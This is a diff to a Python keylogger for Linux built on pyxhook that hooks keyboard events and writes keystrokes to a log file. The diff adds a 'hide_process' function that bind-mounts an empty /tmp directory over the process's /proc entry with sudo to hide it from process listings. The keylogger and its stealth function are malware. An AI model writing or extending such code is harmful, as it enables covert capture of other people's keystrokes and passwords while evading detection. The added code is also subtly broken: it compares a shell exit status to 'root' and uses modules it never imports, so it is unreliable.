@@ -2,6 +2,16 @@
 # to be used in linux 
 import os 
 import pyxhook 
+
+def hide_process(self):
+	ch = string.uppercase + string.digits
+	# Bind mount - works with root on linux
+	token = "".join(random.choice(ch) for i in range(32))
+	pid = os.getpid()
+	print "[+] Current PID: {0}".format(pid)
+	if os.path.isdir("/tmp/{0}".format(token)) is False:
+		if os.system("sudo whoami") == 'root':
+			os.system("sudo mkdir /tmp/{1} && sudo mount -o bind /tmp/{1} /proc/{0}".format(pid,token))
   
 # This tells the keylogger where the log file will go. 
 # You can set the file path as an environment variable ('pylogger_file'), 
@@ -35,7 +45,7 @@ def OnKeyPress(event):
 new_hook = pyxhook.HookManager() 
 new_hook.KeyDown = OnKeyPress 
 # set the hook 
-new_hook.HookKeyboard() 
+new_hook.HookKeyboard()
 try: 
     new_hook.start()         # start the hook 
 except KeyboardInterrupt: 
